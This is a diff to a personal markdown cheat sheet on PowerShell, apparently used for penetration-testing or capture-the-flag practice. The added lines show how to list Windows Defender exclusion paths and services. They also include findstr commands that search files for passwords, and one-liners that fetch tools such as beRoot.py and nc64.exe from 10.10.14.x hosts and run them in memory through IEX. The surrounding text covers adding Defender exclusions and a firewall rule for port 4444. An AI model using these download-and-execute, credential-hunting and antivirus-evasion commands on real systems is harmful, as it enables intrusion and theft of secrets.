@@ -10,7 +10,7 @@ Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
 Links: {Add link(s) [[]] to related terms}
 Search Tag: #📕  
 
-# [[powershell]]  
+# [[03 - Content/powershell]]  
 ___
 
 ## Description:  
@@ -149,6 +149,10 @@ In a pinch, you can even add your own exclusions.
 Set-MpPreference -ExclusionPath "<path>"
 ```
 
+Or look for ones that already exist
+`powershell $(get-MpPreference).ExclusionPath
+
+
 ### Windows error codes
 
 ```
@@ -167,6 +171,38 @@ To remove that rule:
 ```
 netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
 ```
+
+
+### List of services
+
+```
+wmic service list brief
+```
+
+### Look for Passwords
+
+```
+finstr /si password *.txt 2> nul | more 
+
+Also consider *.xml, *.ini, *.*
+
+findstr /spin “password” *.* 2> nul | more
+```
+
+### web requests
+```
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8:80/beRoot.py','beRoot.py')"
+
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/nc64.exe') | powershell -noprofile -
+
+powershell –c "IEX(New-Object NET.WebClient).downloadString('http://10.10.14.45:1234/required_tool’)”
+
+curl.exe -o tool [http://10.10.14.45:1234/required_tool](http://10.10.14.45:1234/required_tool)
+
+Invoke-WebRequest [http://10.10.14.45:1234/required_tool](http://10.10.14.45:1234/required_tool) -O tool
+
+```
+
 
 ___
 
